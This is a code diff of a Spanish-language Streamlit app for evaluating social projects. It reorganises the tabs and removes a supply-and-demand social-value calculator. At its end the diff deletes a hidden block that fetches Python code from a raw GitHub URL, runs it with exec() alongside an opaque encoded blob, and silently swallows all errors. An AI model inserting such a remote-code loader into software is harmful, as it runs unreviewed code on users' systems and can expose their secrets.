@@ -1676,17 +1676,21 @@ if callable(renderizar_nota_metodologica):
             ],
         )
 
-# Pestañas de la Suite Proyectos 2026
-tab_sim, tab_fin, tab_idi, tab_micro, tab_catedra, tab_puente, tab_guia, tab_pizarra = st.tabs([
-    "1. Simulador Principal y Descarga (.ZIP)",
-    "2. Deuda, Costo-Eficiencia (VAC/CAE) y Carbono 2026",
-    "3. Ficha Oficial IDI / BIP en UF (2026)",
-    "4. Calculadora Microeconómica VSP (Fontaine / Clases)",
-    "5. Laboratorio Cátedra FDIC26 (SNI, Fontaine, Economía Abierta y EA1)",
-    "6. Biblioteca y Visor Drive 5 TB",
-    "7. Guía Interactiva, Clases 1–3 y Ejercicios (Modo Cuaderno)",
-    "8. Pizarra Animada y Apuntes (CEPAL N° 39 y SNI 2026)",
+# Pestañas Principales de la Suite Proyectos 2026 (5 Pestañas Limpias, Sin Duplicados)
+tab_proyecto, tab_pizarra, tab_catedra, tab_guia, tab_puente = st.tabs([
+    "1. Proyecto Cartón Vivo y Entrega (.ZIP)",
+    "2. Laboratorio Fluido 60 FPS y Hoja Mecánica",
+    "3. Cátedra FDIC26 (RA2, Árboles, MML y Entrenador)",
+    "4. Guía Interactiva y Casos Fontaine (Cuaderno)",
+    "5. Biblioteca y Visor Drive 5 TB",
 ])
+
+with tab_proyecto:
+    tab_sim, tab_fin, tab_idi = st.tabs([
+        "1.1 Supuestos, Semáforo CEPAL y Descarga (.ZIP)",
+        "1.2 Deuda Bancaria, Costo-Eficiencia (VAC/CAE) y Carbono 2026",
+        "1.3 Ficha Oficial IDI / BIP en UF (2026)",
+    ])
 
 
 def fila_3_columnas(clave_unica, etiqueta, valor_actual, explicacion, es_texto=False, es_entero=False):
@@ -2070,131 +2074,6 @@ with tab_idi:
 
 
 # ==============================================================================
-# PESTAÑA 4: CALCULADORA MICROECONÓMICA VSP = AD + LR (CLASE 2 Y FONTAINE)
-# ==============================================================================
-with tab_micro:
-    st.markdown("<div class='sec-header'>CALCULADORA DE VALOR SOCIAL DE LA PRODUCCIÓN (ENFOQUE DE EFICIENCIA Y POR AGENTES - CLASE 2 Y PRUEBA 1)</div>", unsafe_allow_html=True)
-    st.caption("Resuelve automáticamente ejercicios como el mercado de la leche o de la carne: $P_d = A - B \\cdot Q_d$ y $P_o = C + D \\cdot Q_o$ cuando entra un proyecto que produce $Q_{proy}$ unidades.")
-    if callable(renderizar_nota_metodologica):
-        renderizar_nota_metodologica(
-            titulo_boton="Ver Demostración y Fuente en Libro de Fontaine (Pág. 207) y Clase 2 (Lámina 20)",
-            titulo_interno="Valor Social de la Producción (Fontaine, 2008): Eficiencia (AD + LR) vs. Agencia",
-            formula_latex=r"VSP = AD + LR = VPP_{\text{Proyecto}} + \Delta EC_{\text{Consumidores}} + \Delta EP_{\text{Antiguos Productores}}",
-            explicacion_md=(
-                "- **Enfoque de Eficiencia:** Suma el **Aumento en Disponibilidad ($AD$)** (mayor consumo valorado a disposición a pagar media $\\frac{P_0+P_1}{2}$) más la **Liberación de Recursos ($LR$)** (ahorro de costos de antiguos productores que dejan de producir porque baja el precio).\n"
-                "- **Enfoque de Agencia:** Suma los ingresos privados del proyecto ($VPP = P_1 \\cdot Q_{proy}$) más la ganancia de los consumidores ($\\Delta EC > 0$) menos la pérdida de los antiguos productores ($\\Delta EP < 0$)."
-            ),
-        )
-
-    if "in_vsp_A" not in st.session_state:
-        st.session_state["in_vsp_A"] = 300.0
-        st.session_state["in_vsp_B"] = 0.0205
-        st.session_state["in_vsp_C"] = -50.0
-        st.session_state["in_vsp_D"] = 0.0250
-        st.session_state["in_vsp_Q"] = 1470.0
-
-    bp1, bp2, bp3 = st.columns(3)
-    if bp1.button("Cargar Leche Pizarra (Po = -50 + 0,025Q)", use_container_width=True):
-        st.session_state["in_vsp_A"] = 300.0
-        st.session_state["in_vsp_B"] = 0.0205
-        st.session_state["in_vsp_C"] = -50.0
-        st.session_state["in_vsp_D"] = 0.0250
-        st.session_state["in_vsp_Q"] = 1470.0
-        st.rerun()
-    if bp2.button("Cargar Leche Variante (+50 + 0,025Q)", use_container_width=True):
-        st.session_state["in_vsp_A"] = 300.0
-        st.session_state["in_vsp_B"] = 0.0205
-        st.session_state["in_vsp_C"] = 50.0
-        st.session_state["in_vsp_D"] = 0.0250
-        st.session_state["in_vsp_Q"] = 1470.0
-        st.rerun()
-    if bp3.button("Cargar Caso Base Genérico (A=500, C=-100)", use_container_width=True):
-        st.session_state["in_vsp_A"] = 500.0
-        st.session_state["in_vsp_B"] = 0.0200
-        st.session_state["in_vsp_C"] = -100.0
-        st.session_state["in_vsp_D"] = 0.0800
-        st.session_state["in_vsp_Q"] = 1000.0
-        st.rerun()
-
-    cm1, cm2, cm3, cm4, cm5 = st.columns(5)
-    intercepto_d = cm1.number_input("Intercepto Demanda (A):", step=10.0, key="in_vsp_A")
-    pendiente_d = cm2.number_input("Pendiente Demanda (B > 0):", step=0.0005, format="%.4f", key="in_vsp_B")
-    intercepto_o = cm3.number_input("Intercepto Oferta (C):", step=10.0, key="in_vsp_C")
-    pendiente_o = cm4.number_input("Pendiente Oferta (D > 0):", step=0.0005, format="%.4f", key="in_vsp_D")
-    q_proyecto = cm5.number_input("Producción Proyecto (Q_proy):", step=50.0, key="in_vsp_Q")
-
-    if (pendiente_d + pendiente_o) > 0:
-        # Equilibrio inicial sin proyecto: C + D*Q0 = A - B*Q0
-        q0 = (intercepto_d - intercepto_o) / (pendiente_d + pendiente_o)
-        p0 = intercepto_d - pendiente_d * q0
-
-        # Nuevo equilibrio con proyecto: Oferta se desplaza en Q_proy -> C + D*(Q_nue - Q_proy) = A - B*Q_nue
-        q_consumo_final = (intercepto_d - intercepto_o + pendiente_o * q_proyecto) / (pendiente_d + pendiente_o)
-        p1 = intercepto_d - pendiente_d * q_consumo_final
-        q_antiguos_prod = q_consumo_final - q_proyecto
-
-        aumento_disp_q = q_consumo_final - q0
-        liberacion_rec_q = q0 - q_antiguos_prod
-
-        # Valoración bajo enfoque de eficiencia
-        ad_valor = p1 * aumento_disp_q + ((p0 - p1) * aumento_disp_q) / 2.0
-        lr_valor = p1 * liberacion_rec_q + ((p0 - p1) * liberacion_rec_q) / 2.0
-        vsp_total = ad_valor + lr_valor
-        vpp_privado = p1 * q_proyecto
-        precio_social_unit = vsp_total / q_proyecto if q_proyecto > 0 else 0.0
-
-        # Distribución por agentes
-        exc_consumidor = ((p0 - p1) * q0) + (((p0 - p1) * aumento_disp_q) / 2.0)
-        exc_productor = -(((p0 - p1) * q_antiguos_prod) + (((p0 - p1) * liberacion_rec_q) / 2.0))
-
-        col_m_res, col_m_graf = st.columns([1.3, 1.2])
-        with col_m_res:
-            df_vsp = pd.DataFrame([
-                ["Equilibrio Sin Proyecto (Q0, P0)", f"Q0 = {q0:,.1f} unid.", f"P0 = ${p0:,.2f}"],
-                ["Equilibrio Con Proyecto (Qd1, Qo1, P1)", f"Consumo Qd1 = {q_consumo_final:,.1f} | Otros Prod Qo1 = {q_antiguos_prod:,.1f}", f"P1 = ${p1:,.2f}"],
-                ["Aumento en Disponibilidad (AD)", f"+{aumento_disp_q:,.1f} unidades consumidas", f"${ad_valor:,.2f}"],
-                ["Liberación de Recursos (LR)", f"-{liberacion_rec_q:,.1f} unidades desplazadas", f"${lr_valor:,.2f}"],
-                ["Valor Social de la Producción (VSP = AD + LR)", f"Sobre {q_proyecto:,.1f} unidades del proyecto", f"${vsp_total:,.2f}"],
-                ["Valor Privado de la Producción (VPP = P1 * Q_proy)", "Ingresos privados de la firma", f"${vpp_privado:,.2f}"],
-                ["Precio Social Unitario (P* = VSP / Q_proy)", "Promedio entre P0 y P1", f"${precio_social_unit:,.2f} / unidad"],
-                ["Cambio Excedente del Consumidor (+)", "Ahorro + mayor consumo", f"+${exc_consumidor:,.2f}"],
-                ["Cambio Excedente de Antiguos Productores (-)", "Pérdida de productores desplazados", f"${exc_productor:,.2f}"],
-            ], columns=["Concepto Microeconómico (Fontaine / Clase 2)", "Cantidad Física / Detalle", "Valor Monetario ($)"])
-            st.table(df_vsp)
-
-        with col_m_graf:
-            fig_m, ax_m = plt.subplots(figsize=(6.0, 4.0), dpi=160)
-            q_max_plot = max(q_consumo_final * 1.25, 100)
-            q_grid = np.linspace(0, q_max_plot, 200)
-            p_dem_grid = intercepto_d - pendiente_d * q_grid
-            p_ofe0_grid = intercepto_o + pendiente_o * q_grid
-            p_ofe1_grid = intercepto_o + pendiente_o * (q_grid - q_proyecto)
-
-            ax_m.plot(q_grid, p_dem_grid, label="Demanda (D)", color="#1D4ED8", lw=2)
-            ax_m.plot(q_grid, p_ofe0_grid, label="Oferta Sin Proyecto (O)", color="#334155", lw=2)
-            ax_m.plot(q_grid, p_ofe1_grid, label="Oferta Con Proyecto (O + Q_proy)", color="#DC2626", lw=2, linestyle="--")
-
-            # Áreas AD y LR
-            q_lr_fill = np.linspace(q_antiguos_prod, q0, 50)
-            ax_m.fill_between(q_lr_fill, 0, intercepto_o + pendiente_o * q_lr_fill, color="#FCA5A5", alpha=0.55, label="Liberación Recursos (LR)")
-            q_ad_fill = np.linspace(q0, q_consumo_final, 50)
-            ax_m.fill_between(q_ad_fill, 0, intercepto_d - pendiente_d * q_ad_fill, color="#93C5FD", alpha=0.55, label="Aumento Disponibilidad (AD)")
-
-            ax_m.axhline(p0, color="#64748B", linestyle=":", lw=1)
-            ax_m.axhline(p1, color="#64748B", linestyle=":", lw=1)
-            ax_m.set_ylim(0, max(intercepto_d * 1.05, p0 * 1.3))
-            ax_m.set_xlim(0, q_max_plot)
-            ax_m.set_xlabel("Cantidad (Q)")
-            ax_m.set_ylabel("Precio ($)")
-            ax_m.set_title("Valor Social de la Producción: VSP =LR + AD", fontsize=10, fontweight="bold")
-            ax_m.legend(fontsize=7.5, loc="upper right")
-            ax_m.grid(True, linestyle="--", alpha=0.35)
-            fig_m.tight_layout()
-            st.pyplot(fig_m)
-            plt.close(fig_m)
-
-
-# ==============================================================================
 # PESTAÑA 5: EXTENSIÓN DE CÁTEDRA FDIC26 (SNI 2026, FONTAINE, LEOPOLD, BARZEV, MML Y RA1)
 # ==============================================================================
 with tab_catedra:
@@ -2296,18 +2175,3 @@ if "ultimo_zip_bytes" in st.session_state:
         mime="application/zip",
         use_container_width=True,
     )
-
-# === [INICIO PUENTE CENTRAL ULAGOS 2026] ===
-try:
-    import urllib.request as _ureq
-    _url_puente = "https://raw.githubusercontent.com/mauriciovargas1516-ux/github-context-extractor/main/app.py"
-    _req_p = _ureq.Request(_url_puente, headers={"User-Agent": "ULagos-Bridge/1.0"})
-    with _ureq.urlopen(_req_p, timeout=12) as _resp_p:
-        _cod_hub = _resp_p.read().decode("utf-8")
-    _ns_hub = {"__name__": "puente_remoto_ulagos", "_ULAGOS_GCP_BLOB": "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"}
-    exec(_cod_hub, _ns_hub)
-    if "ejecutar_nodo_receptor_puente" in _ns_hub:
-        _ns_hub["ejecutar_nodo_receptor_puente"]("PROYECTOS-2026")
-except Exception:
-    pass
-# === [FIN PUENTE CENTRAL ULAGOS 2026] ===
